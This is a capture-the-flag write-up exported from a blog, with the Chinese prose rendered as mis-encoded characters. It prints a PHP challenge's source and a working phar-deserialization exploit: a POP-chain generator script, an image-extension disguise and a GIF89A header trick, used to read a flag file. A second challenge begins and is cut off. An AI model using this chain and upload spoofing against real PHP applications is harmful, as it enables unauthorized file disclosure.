class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//file.php?file=index.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;base.php&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//file.php?file=base.php</span><br><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">echo</span> <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>];<span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//file.php?file=file.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;class.php&#x27;</span>; <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>,<span class="hljs-string">&#x27;/var/www/html/&#x27;</span>); <br><span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;file&quot;</span>] ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-string">&quot;&quot;</span>; <br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; <br>&#125; <br><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(); <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-variable">$show</span>-&gt;source = <span class="hljs-variable">$file</span>; <br>    <span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">_show</span>(); <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>))&#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); <br>&#125; <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//file.php?file=upload_file.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-keyword">include</span> <span class="hljs-string">&#x27;function.php&#x27;</span>; <br><span class="hljs-title function_ invoke__">upload_file</span>(); <br><span class="hljs-meta">?&gt;</span><br><span class="hljs-comment">//file.php?file=function.php</span><br><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//show_source(__FILE__); </span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;base.php&quot;</span>; <br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); <br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>); <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]).<span class="hljs-string">&quot;.jpg&quot;</span>; <br>    <span class="hljs-comment">//mkdir(&quot;upload&quot;,0777); </span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>)) &#123; <br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>); <br>    &#125; <br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>); <br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;ä¸Šä¼ æˆåŠŸ!&quot;);&lt;/script&gt;&#x27;</span>; <br>&#125; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">upload_file_check</span>()) &#123; <br>        <span class="hljs-title function_ invoke__">upload_file_do</span>(); <br>    &#125; <br>&#125; <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_check</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-variable">$allowed_types</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;gif&quot;</span>,<span class="hljs-string">&quot;jpeg&quot;</span>,<span class="hljs-string">&quot;jpg&quot;</span>,<span class="hljs-string">&quot;png&quot;</span>); <br>    <span class="hljs-variable">$temp</span> = <span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]); <br>    <span class="hljs-variable">$extension</span> = <span class="hljs-title function_ invoke__">end</span>(<span class="hljs-variable">$temp</span>); <br>    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$extension</span>)) &#123; <br>        <span class="hljs-comment">//echo &quot;&lt;h4&gt;è¯·é€‰æ‹©ä¸Šä¼ çš„æ–‡ä»¶:&quot; . &quot;&lt;h4/&gt;&quot;; </span><br>    &#125; <br>    <span class="hljs-keyword">else</span>&#123; <br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$extension</span>,<span class="hljs-variable">$allowed_types</span>)) &#123; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>; <br>        &#125; <br>        <span class="hljs-keyword">else</span> &#123; <br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; <br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>; <br>        &#125; <br>    &#125; <br>&#125; <br><span class="hljs-meta">?&gt;</span> <br><span class="hljs-comment">//file.php?file=class.php</span><br> <span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;str = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;test = <span class="hljs-variable language_">$this</span>-&gt;str;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$file</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-variable">$file</span>;   <span class="hljs-comment">//$this-&gt;source = phar://phar.jpg</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;source;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$content</span> = <span class="hljs-variable language_">$this</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]-&gt;source;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$key</span> = <span class="hljs-variable">$value</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_show</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!&#x27;</span>);<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$this</span>-&gt;source);<br>        &#125;<br>        <br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="hljs-variable">$this</span>-&gt;source)) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;hacker~&quot;</span>;<br>            <span class="hljs-variable language_">$this</span>-&gt;source = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;params = <span class="hljs-keyword">array</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$key</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$key</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>])) &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-variable language_">$this</span>-&gt;params[<span class="hljs-variable">$key</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$value</span> = <span class="hljs-string">&quot;index.php&quot;</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">file_get</span>(<span class="hljs-variable">$value</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">file_get</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$text</span> = <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$value</span>));<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$text</span>;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure><p>æ³¨æ„è¿™æ®µä»£ç å’Œæ³¨é‡Š<code>//$this-&gt;source = phar://phar.jpg</code>ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$show</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>(); <br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$file</span>)) &#123; <br>    <span class="hljs-variable">$show</span>-&gt;source = <span class="hljs-variable">$file</span>; <br>    <span class="hljs-variable">$show</span>-&gt;<span class="hljs-title function_ invoke__">_show</span>(); <br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$file</span>))&#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); <br>&#125; <br></code></pre></td></tr></table></figure><p>æ³¨æ„<code>file.php</code>ä¸‹æœ‰è¿™ä¹ˆä¸ªä¸œè¥¿ï¼š</p><p><code>ini_set(&#39;open_basedir&#39;,&#39;/var/www/html/&#39;); </code>ç»“åˆæ³¨é‡Š<code>f1ag.php</code></p><p>ç›®æ ‡æ–‡ä»¶<code>/var/www/html/f1ag.php</code></p><p><code>phar</code>ååºåˆ—åŒ–ï¼Œå…ˆå†™é“¾å­ï¼š</p><p>æç¤º<code>flag</code>åœ¨<code>f1ag.php</code>ä¸­ï¼Œ<code>C1e4r</code>ä¸‹å­˜åœ¨<code>__destruct</code>ï¼Œä»¥è¿™ä¸œè¥¿ä¸ºèµ·ç‚¹è°ƒç”¨<code>Show</code>ä¸‹çš„<code>__toString</code>ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$a</span> -&gt; str = <span class="hljs-variable">$b</span>;<span class="hljs-comment">//è§¦å‘Showä¸‹çš„__toStringæ–¹æ³•ï¼Œå› ä¸ºä¸€ä¸ªç±»è¢«å½“æˆå­—ç¬¦ä¸²äº†</span><br><span class="hljs-variable">$b</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-variable">$c</span>;<span class="hljs-comment">//è§¦å‘__getæ–¹æ³•ï¼Œå› ä¸ºTeståº•ä¸‹å¹¶æ²¡æœ‰sourceã€‚è¿™æ—¶$keyå°±æ˜¯source</span><br><span class="hljs-variable">$c</span> -&gt; params = <span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;/var/www/html/f1ag.php&quot;</span>);<span class="hljs-comment">//æ³¨æ„ini_set</span><br></code></pre></td></tr></table></figure><p>ç”Ÿæˆ<code>phar</code>æ–‡ä»¶ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">C1e4r</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Show</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$source</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$str</span>;<br><br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$file</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$params</span>;<br><br>&#125;<br><br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">C1e4r</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Show</span>();<br><span class="hljs-variable">$c</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Test</span>();<br><span class="hljs-variable">$a</span> -&gt; str = <span class="hljs-variable">$b</span>;<br><span class="hljs-variable">$b</span>-&gt;str[<span class="hljs-string">&#x27;str&#x27;</span>]=<span class="hljs-variable">$c</span>;<br><span class="hljs-variable">$c</span> -&gt; params = <span class="hljs-title function_ invoke__">Array</span>(<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;/var/www/html/f1ag.php&quot;</span>);<br><br><span class="hljs-variable">$phar</span> =<span class="hljs-keyword">new</span> <span class="hljs-title class_">Phar</span>(<span class="hljs-string">&quot;pharwhat.phar&quot;</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">startBuffering</span>();<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setStub</span>(<span class="hljs-string">&quot;__HALT_COMPILER(); ?&gt;&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">setMetadata</span>(<span class="hljs-variable">$a</span>); <br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">addFromString</span>(<span class="hljs-string">&quot;test.txt&quot;</span>, <span class="hljs-string">&quot;test&quot;</span>);<br><span class="hljs-variable">$phar</span>-&gt;<span class="hljs-title function_ invoke__">stopBuffering</span>();<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>ç”Ÿæˆ<code>pharwhat.phar</code>ï¼Œç„¶åä¿®æ”¹ä¸‹åç¼€:<code>&quot;gif&quot;,&quot;jpeg&quot;,&quot;jpg&quot;,&quot;png&quot;</code>æŒ‘ä¸€ä¸ªå°±è¡Œã€‚</p><p>æ³¨æ„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">upload_file_do</span>(<span class="hljs-params"></span>) </span>&#123; <br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$_FILES</span>; <br>    <span class="hljs-variable">$filename</span> = <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>].<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&quot;REMOTE_ADDR&quot;</span>]).<span class="hljs-string">&quot;.jpg&quot;</span>; <br>    <span class="hljs-comment">//mkdir(&quot;upload&quot;,0777); </span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>)) &#123; <br>        <span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$filename</span>); <br>    &#125; <br>    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>],<span class="hljs-string">&quot;upload/&quot;</span> . <span class="hljs-variable">$filename</span>); <br></code></pre></td></tr></table></figure><p>å¦‚æœæˆ‘ä»¬ä¸Šä¼ <code>pharwhat.jpg</code>ï¼Œé‚£ä¹ˆæœ€ç»ˆä¸Šä¼ è·¯å¾„æ˜¯ï¼š</p><p><code>upload/92f5bc75f24c46a61e46ab7b46dcb42d.jpg</code></p><p><img src="/img/simplephp18.png" alt="simplephp18"></p><p>ç„¶åbase64è§£ç å°±è¡Œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment">//$a = &#x27;flag&#123;0ad36cdc-1e96-44ed-a9cb-a5fe000473c7&#125;&#x27;;</span><br> <span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><p>åé¢çœ‹å…¶å®ƒå¸ˆå‚…ä»¬çš„<code>wp</code>æ—¶å‘ç°åœ¨ç”Ÿæˆ<code>phar</code>æ–‡ä»¶æ—¶å¯ä»¥è¿™ä¹ˆå†™ï¼š</p><p><code>$phar-&gt;setStub(&quot;GIF89A&lt;?php XXX __HALT_COMPILER(); ?&gt;&quot;);</code></p><p>å…¶å®å°±æ˜¯åŠ äº†ä¸ª<code>GIF89A</code>æ¬ºéª—å¤´ï¼Œè¿™é“é¢˜ä¸åŠ ä¹Ÿèƒ½æ‹¿ç»“æœ(å› ä¸ºå¹¶æ²¡æœ‰æ£€æµ‹æ–‡ä»¶å†…å®¹)ã€‚ç”Ÿæˆçš„æ–‡ä»¶å†…å®¹æ˜¯ï¼š</p><p><img src="/img/simplephp4.png" alt="simplephp4"></p><p>çœ‹æ ·å­ä»¥åè¿˜æ˜¯åŠ ä¸Šæ¬ºéª—å¤´å¥½ä¸€äº›ï¼Œä¸åŠ ç™½ä¸åŠ ã€‚ã€‚</p><h2 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="[NPUCTF2020]ezinclude"></a>[NPUCTF2020]ezinclude</h2><p><img src="/img/ezinclude1.png" alt="ezinclude1"></p><p>çœ‹æºç ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html">username/password error<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-comment">&lt;!--md5($secret.$name)===$pass --&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æŠ“åŒ…ï¼š</p><p><img src="/img/ezinclude2.png" alt="ezinclude2"></p><p>æ³¨æ„<code>Cookie</code>é‡Œç»™äº†å“ˆå¸Œå€¼ï¼Œæƒ³ç€è¿™ä¸œè¥¿ä¼šä¸ä¼šè¦æ±‚<code>$pass</code>å˜é‡å¼ºç­‰äºå®ƒï¼Ÿä¸è¿‡<code>pass</code>æ€ä¹ˆ ä¼ ä¹Ÿæ²¡è¯´ï¼Œå°±ç”¨<code>GET</code>æ–¹æ³•ä¼ ç€è¯•äº†è¯•ï¼š</p><p><img src="/img/ezinclude3.png" alt="ezinclude3"></p><p>è®¿é—®<code>flflflflag.php</code></p><p><img src="/img/ezinclude4.png" alt="ezinclude4"></p><p>æˆ‘è¿™ä¸ªç¯å¢ƒä¸çŸ¥é“æ€ä¹ˆå›äº‹ä¸€ç›´å›æ˜¾<code>404</code>ã€‚ã€‚åªèƒ½åœ¨<code>bp</code>ä¸Šçœ‹äº†ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span 